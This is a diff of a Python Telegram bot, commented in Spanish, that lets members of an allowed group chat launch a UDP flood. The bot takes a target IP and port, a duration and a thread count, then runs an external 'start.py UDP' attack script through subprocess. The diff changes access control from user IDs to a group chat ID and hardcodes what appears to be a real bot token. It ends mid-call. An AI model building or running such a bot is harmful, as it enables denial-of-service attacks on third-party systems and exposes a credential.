@@ -2,18 +2,18 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
-# Token del bot (obtén el token de @BotFather en Telegram)
+# Token del bot
 TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"
 
-# Lista de usuarios permitidos (IDs de Telegram)
-users = ['3728288228']
+# Lista de chats permitidos (IDs de chats o grupos de Telegram)
+allowed_chats = ['-1002392775903']  # Usa el ID de tu grupo o chat aquí
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Verifica que el usuario esté autorizado
-    user_id = str(update.effective_user.id)
-    if user_id not in users:
-        await update.message.reply_text("No tienes permiso para usar este bot.")
+    # Verifica que el chat esté autorizado
+    chat_id = str(update.effective_chat.id)
+    if chat_id not in allowed_chats:
+        await update.message.reply_text("Este bot no está permitido en este chat o grupo.")
         return
 
     # Verifica que el usuario haya ingresado los parámetros necesarios
@@ -24,14 +24,13 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Obtiene los argumentos del mensaje
-    target = context.args[0]  # Dirección IP:Puerto
-    duration = context.args[1]  # Duración en segundos
-    threads = context.args[2]  # Número de threads
+    target = context.args[0]
+    duration = context.args[1]
+    threads = context.args[2]
 
     # Construye el comando a ejecutar
     command = f"python3 start.py UDP {target} {duration} {threads}"
-    
-    # Ejecuta el comando y responde al usuario
+
     try:
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         await update.message.reply_text(
